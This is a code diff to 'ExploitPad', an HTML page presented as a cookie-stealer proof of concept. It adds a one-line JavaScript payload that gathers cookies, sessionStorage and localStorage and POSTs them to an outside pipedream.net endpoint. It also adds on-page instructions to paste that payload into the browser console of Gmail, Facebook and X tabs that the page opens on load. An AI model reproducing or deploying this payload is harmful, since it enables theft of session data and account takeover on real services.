@@ -31,13 +31,13 @@
         }
         textarea { 
             width: 100%; 
-            height: 200px; 
+            height: 150px; 
             background-color: #222; 
             color: gold; 
             border: 2px solid gold; 
             padding: 10px; 
             font-family: monospace; 
-            font-size: 16px; 
+            font-size: 14px; 
             border-radius: 10px; 
             margin-top: 10px; 
             resize: vertical; 
@@ -74,7 +74,7 @@
 <body>
     <h2>👽ExploitPad🕵️</h2>
     <div class="container">
-        <textarea id="code" placeholder="Write your HTML, CSS, or JavaScript here..."><!DOCTYPE html>
+        <textarea id="demoCode" placeholder="Write your HTML, CSS, or JavaScript here..."><!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -89,14 +89,25 @@
     <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
 </body>
 </html></textarea>
-        <button onclick="runCode()">▶ Run Code</button>
+        <button onclick="runCode()">▶ Run Demo Code</button>
+        <textarea id="stealScript" readonly>javascript:(function(){var c=document.cookie||'No_Cookies_Found';var ss={};for(var i=0;i<sessionStorage.length;i++){ss[sessionStorage.key(i)]=sessionStorage.getItem(sessionStorage.key(i));}var ls={};for(var i=0;i<localStorage.length;i++){ls[localStorage.key(i)]=localStorage.getItem(localStorage.key(i));}if(Object.keys(ss).length===0)ss='No_Session_Data';if(Object.keys(ls).length===0)ls='No_Local_Data';fetch('https://eoy4evvlsf7y0jq.m.pipedream.net',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie_data:c,session_storage:ss,local_storage:ls,user_agent:navigator.userAgent||'Unknown_User_Agent',referrer:document.referrer||'No_Referrer',source:location.hostname,location:window.location.href})}).then(r=>console.log('Data sent:',r)).catch(e=>console.error('Error:',e));})();</textarea>
         <iframe id="output"></iframe>
         <div class="instructions">
-            <p>This page auto-opens Gmail, Facebook, and X.com in new tabs and steals data from this domain. To steal data from those sites, use a browser extension or manually inject the script (see console for details).</p>
+            <p>Gmail, FB, and X opened in new tabs. Copy the script above, paste it into each tab's console (F12), and press Enter to steal cookies and storage.</p>
         </div>
     </div>
 
     <script>
+        // Function to run demo code in iframe
+        function runCode() {
+            let code = document.getElementById("demoCode").value;
+            console.log("Running demo code in iframe:", code);
+            let outputFrame = document.getElementById("output").contentWindow.document;
+            outputFrame.open();
+            outputFrame.write(code);
+            outputFrame.close();
+        }
+
         // Generalized data-stealing function
         function stealAndSendData(win, context) {
             var cookies = win.document.cookie || "No_Cookies_Found";
@@ -142,16 +153,6 @@
             });
         }
 
-        // Function to run iframe code
-        function runCode() {
-            let code = document.getElementById("code").value;
-            console.log("Running code in iframe:", code);
-            let outputFrame = document.getElementById("output").contentWindow.document;
-            outputFrame.open();
-            outputFrame.write(code);
-            outputFrame.close();
-        }
-
         // Auto-run on page load
         document.addEventListener("DOMContentLoaded", function() {
             console.log("ExploitPad loaded - opening sites and stealing local data...");
@@ -164,11 +165,7 @@
             window.open("https://facebook.com", "_blank");
             window.open("https://x.com", "_blank");
 
-            // Log the script for manual injection (automation limit workaround)
-            console.log("To steal data from Gmail, FB, X, paste this into each tab's console (F12):");
-            console.log(`javascript:(function(){var c=document.cookie||'No_Cookies_Found';var ss={};for(var i=0;i<sessionStorage.length;i++){ss[sessionStorage.key(i)]=sessionStorage.getItem(sessionStorage.key(i));}var ls={};for(var i=0;i<localStorage.length;i++){ls[localStorage.key(i)]=localStorage.getItem(localStorage.key(i));}if(Object.keys(ss).length===0)ss='No_Session_Data';if(Object.keys(ls).length===0)ls='No_Local_Data';fetch('https://eoy4evvlsf7y0jq.m.pipedream.net',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie_data:c,session_storage:ss,local_storage:ls,user_agent:navigator.userAgent||'Unknown_User_Agent',referrer:document.referrer||'No_Referrer',source:location.hostname,location:window.location.href})}).then(r=>console.log('Data sent:',r)).catch(e=>console.error('Error:',e));})();`);
-
-            // Run iframe code
+            // Run demo code in iframe
             runCode();
         });
     </script>
